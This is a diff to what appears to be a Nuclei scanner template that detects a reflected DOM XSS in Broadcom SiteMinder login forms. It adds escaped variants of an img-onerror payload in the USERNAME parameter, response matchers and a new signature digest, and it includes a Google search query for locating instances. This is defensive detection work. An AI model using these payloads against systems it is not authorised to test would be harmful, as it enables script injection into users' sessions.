@@ -19,13 +19,15 @@ info:
     google-query: inurl:"smpwservices.fcc"
     product: siteminder
     vendor: broadcom
-  tags: dom,xss,siteminder
+  tags: dom,xss,siteminder,vuln
 
 http:
   - method: GET
     path:
       - '{{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
       - '{{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
+      - '{{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7'
+      - '{{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7'
 
     stop-at-first-match: true
 
@@ -34,6 +36,8 @@ http:
       - type: word
         words:
           - '\u003d\u0022confirm(document.domain)\u0022\u003e</B> you cannot access your'
+          - '\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e</B> you cannot access your'
+        condition: or
 
       - type: word
         part: header
@@ -43,4 +47,4 @@ http:
       - type: status
         status:
           - 200
-# digest: 490a0046304402202c38c5da0a3ffb8974f28ca7fd51851e02c5fa81e1d6308cda4d0cf70cb9406802204344974b85e9d65ecdee99d6667ed7bab606e2298cd8d8e0ba56f6c45513d054:922c64590222798bb761d5b6d8e72950
+# digest: 4b0a00483046022100f872dc30333b1b9198c54a26b2971573d0b861ddaa6d9b9c7428152ad9996434022100b1eb39556257d5973cff49830f001c104748cc1a0fd093887ed86e83114cc912:922c64590222798bb761d5b6d8e72950
